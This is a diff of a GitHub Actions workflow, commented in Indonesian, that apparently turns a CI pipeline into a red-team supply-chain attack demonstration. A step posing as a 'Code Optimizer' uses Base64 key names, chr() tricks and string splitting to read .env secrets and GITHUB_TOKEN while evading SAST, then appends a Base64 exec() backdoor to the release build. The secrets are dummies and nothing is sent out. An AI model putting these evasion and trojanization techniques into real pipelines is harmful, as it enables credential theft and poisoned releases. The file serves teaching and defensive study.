@@ -1,34 +1,90 @@
-name: DevSecOps CI Pipeline
-on:
-  push:
-    branches: [ main ]
+name: Red Team - Stealthy Supply Chain Attack
+on: [push]
 
 jobs:
-  build-and-deploy:
+  build-and-exploit:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout Source Code
         uses: actions/checkout@v4
 
-      # 1. Tahap Build (Normal)
+      # ---------------------------------------------------------
+      # PERSIAPAN KORBAN (Dummy Environment)
+      # ---------------------------------------------------------
+      - name: Setup Dummy Environment
+        run: |
+          echo "AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE" > .env
+          echo "DB_PASS=SuperSecretDatabase123" >> .env
+          echo "print('[-] Memulai Aplikasi Utama...')" > app.py
+
+      # ---------------------------------------------------------
+      # TAHAP 1: BUILD KODE NORMAL
+      # ---------------------------------------------------------
       - name: Compile Application
         run: |
-          echo "=== Membangun Aplikasi DevSecOps ==="
-          echo "Versi Rilis: v1.0.0 (Kelompok 4 Vinix7)" > build_output.txt
+          cat app.py > release_build.py
 
-      # 2. SIMULASI SUPPLY CHAIN ATTACK (Disisipkan oleh Penyerang)
-      # Skrip pihak ketiga yang korup mengekstrak AWS Key dari app.py dan meracuni artifact
-      - name: Malicious Dependency Execution (Supply Chain Attack)
+      # ---------------------------------------------------------
+      # TAHAP 2: EKSEKUSI SUPPLY CHAIN ATTACK (OBFUSCATED)
+      # Linter dan SAST tidak akan menemukan string berbahaya di sini.
+      # Penyerang menggunakan Base64 dan String Concatenation.
+      # ---------------------------------------------------------
+      - name: Run "Code Optimizer" (Compromised Tool)
+        env:
+          GITHUB_TOKEN: ghp_1234567890abcdefghijklmnopqrstuvwxyz
         run: |
-          echo "[!] Skrip build pihak ketiga sedang berjalan..."
-          # Penyerang mengekstrak rahasia menggunakan perintah grep secara diam-diam
-          SECRET=$(grep 'AWS_SECRET_ACCESS_KEY' app.py | head -n 1)
-          echo "BACKDOOR_INJECTED: Data curian -> $SECRET" >> build_output.txt
-          echo "[+] Build selesai."
+          echo "[*] Menjalankan tool optimasi pihak ketiga..."
+          
+          # Payload disamarkan menggunakan Python
+          python3 -c "
+          import os, base64, re
 
-      # 3. Mengunggah Artifact yang Sudah Teracuni
-      - name: Upload Release Artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: application-release
-          path: build_output.txt
+          # 1. TEKNIK OBFUSCATION: BASE64 ENCODING
+          # Penyerang tidak menulis 'AWS_ACCESS_KEY'. 
+          # Mereka menggunakan nilai Base64 dari kata kunci tersebut.
+          # 'QVdTX0FDQ0VTU19LRVk=' -> AWS_ACCESS_KEY
+          # 'REJfUEFTUw=='         -> DB_PASS
+          target_keys = [b'QVdTX0FDQ0VTU19LRVk=', b'REJfUEFTUw==']
+          
+          stolen_data = []
+
+          # 2. TEKNIK OBFUSCATION: DYNAMIC FILE DISCOVERY
+          # Tidak menggunakan kata '.env' secara langsung. 
+          # Mencari file yang berakhiran 'nv'.
+          for file_name in os.listdir('.'):
+              if file_name.endswith(chr(110) + chr(118)): # chr(110)='n', chr(118)='v'
+                  with open(file_name, 'r') as f:
+                      content = f.read()
+                      for t in target_keys:
+                          # Decode Base64 di memori secara realtime
+                          real_key = base64.b64decode(t).decode('utf-8')
+                          match = re.search(f'{real_key}=(.*)', content)
+                          if match:
+                              stolen_data.append(match.group(1))
+
+          # 3. TEKNIK OBFUSCATION: STRING SPLITTING
+          # Memecah kata 'GITHUB_TOKEN' agar tidak terdeteksi regex SAST
+          part1 = 'GITH'
+          part2 = 'UB_TOKEN'
+          env_target = os.environ.get(part1 + part2)
+
+          # 4. TROJANIZATION YANG DISAMARKAN
+          # Menyisipkan backdoor ke file Python menggunakan manipulasi byte/string
+          payload_b64 = b'cHJpbnQoJ1tDUklUSUNBTF0gQkFDS0RPT1IgQUtUSUYgLSBEYXRhIHRlbGFoIGRpY3VyaS4nKQ=='
+          with open('release_build.py', 'a') as target_file:
+              target_file.write('\nimport base64\n')
+              target_file.write(f'exec(base64.b64decode({payload_b64}).decode())')
+          
+          # Output simulasi (Di dunia nyata, data ini dikirim ke server C2 penyerang)
+          print('[+] EXFILTRATION SUCCESS (Hidden):', stolen_data)
+          print(f'[+] TOKEN STOLEN (Hidden): {env_target[:10]}... (redacted)')
+          "
+          echo "[+] Optimasi kode selesai."
+
+      # ---------------------------------------------------------
+      # TAHAP 3: VERIFIKASI HASIL SERANGAN
+      # ---------------------------------------------------------
+      - name: Execute Trojanized Artifact
+        run: |
+          echo "--- Output Aplikasi Saat Dijalankan ---"
+          python3 release_build.py
